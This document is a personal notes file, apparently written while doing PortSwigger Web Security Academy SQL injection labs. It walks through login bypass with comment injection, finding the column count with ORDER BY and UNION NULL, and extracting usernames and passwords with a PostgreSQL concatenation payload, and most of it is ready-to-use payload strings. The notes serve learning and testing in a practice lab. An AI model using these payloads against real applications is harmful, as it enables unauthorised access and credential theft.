/filter?category='+OR+1=1--
/filter?category='+OR+1=1--
/filter?category='+OR+1=1--
/filter?category='+OR+1=1--
/filter?category='+OR+1=1--
/filter?category='+OR+1=1--
/filter?category='+OR+1=1--
/filter?cateogry='+OR+1=1--
/filter?category='+OR+1=1--
/filter?category='+OR+1=1--
filter?category=Gifts'--
https://insecure-website.com/products?category=Gifts'+OR+1=1--
filter?category=%27+OR+1=1--
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
# Burp Suite Academy

## Login Functionality
### Bypassing Pasword

> Example of sql query in the backend to retrieve users
```sql
SELECT firstname FROM users where username='admin' and password='hash'
```

> Example of use of the ' character. When trying to login as ' if it breaks the application on passing it as fill to the prompt or Username and with any password it is prob vuln, as it shows response, and also allow the character ' to close the parameter and produce a syntax error
```sql
SELECT firstname FROM users where username=''' and password='hash'
```

> Into passing user'-- it will cause the query to comment the password part bypassing the password
```sql
SELECT firstname FROM users where username='user'--' and password='hash'
```

## Union Attacks
### SQL injection UNION attack, determining the number of columns returned by the query
---

|  table1  |  table2  |
|:--------:|:--------:|
| a \| b   | a \| b   |
| 1 , 2    | 2 , 3    |
| 3 , 4    | 4 , 5    |

> Example of the SQL query in the backend using the UNION keyword to retrieve data from another tables in the DB
```sql
SELECT a, b FROM table1
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
> -error -> incorrect number of columns
```sql
SELECT ? FROM table1 UNION SELECT NULL
```

> 200 response code -> correct number of columns
```sql
SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL
```
> How that looks on an url 
```
filter?category=Gifts'+UNION+SELECT+NULL--
```
```
filter?category=Gifts'+UNION+SELECT+NULL, NULL, NULL--
```
Also passing ORDER BY n, being n the amount of tables we think the UNION is relying on. If we get an error, that means the amount of tables is incorret so
for example in the case bellow, if passing 3 gives an error and passing 2 don't means it's realying on 2 tables.

> Example of the SQL Query in the backend
```sql 
select a,b from table1 ORDER BY 2
```
> How that looks on an url
```
filter?category=Gifts' ORDER BY 3--
```

### SQL Injection UNION attack, retrieving multiple values in a single column
---
#### URL Injection Method

The objective is to Retrieve all usernames and passwords and login as the administrator user.

> by clicking on Accesories we see on the url  
```
filter?category=Accesories
```

> by modifying that, with a SQL character we got a server error so it's vulnerable to SQL injections
```
filter?category=Accesories'
```

> On URL Determine the number of columns that are being returned by the query
```
filter?category=Accesories'+order by 1--
filter?category=Accesories'+order by 2--
filter?category=Accesories'+order by 3--
```
On the third it crashses so it's returning 2 columns

> Also
```
filter?category=Accesories'+UNION+SELECT+NULL--
```
> Nonetheless the below query does return two columns

```
filter+category=Accesories'+UNION+SELECT+NULL,NULL--
```

> And the below query does produces another server error, so 2 columns are being returned
```
filter+category=Accesories'+UNION+SELECT+NULL,NULL,NULL--
```


> Outputing data from another tables
```
' UNION SELECT NULL, username from users--
' UNION SELECT NULL, password from users--
```

Outputting both in one query, [String Concatenation](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Figuring out the [database version](https://portswigger.net/web-security/sql-injection/cheat-sheet#database-version)
> Test the commands to query the database version, the one that outputs resulting is
```
' UNION SELECT null, version()--
```
So its a PostgreSQL database

> The command to Concatenate strings in PostgreSQL would be
```
' UNION SELECT NULL, username || password from users--
```
> That returns all concatenate, to put a random character, so we know where each one starts and end
```
' UNION SELECT NULL, username || '*' || password from users--
```

> Academy Solution:
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
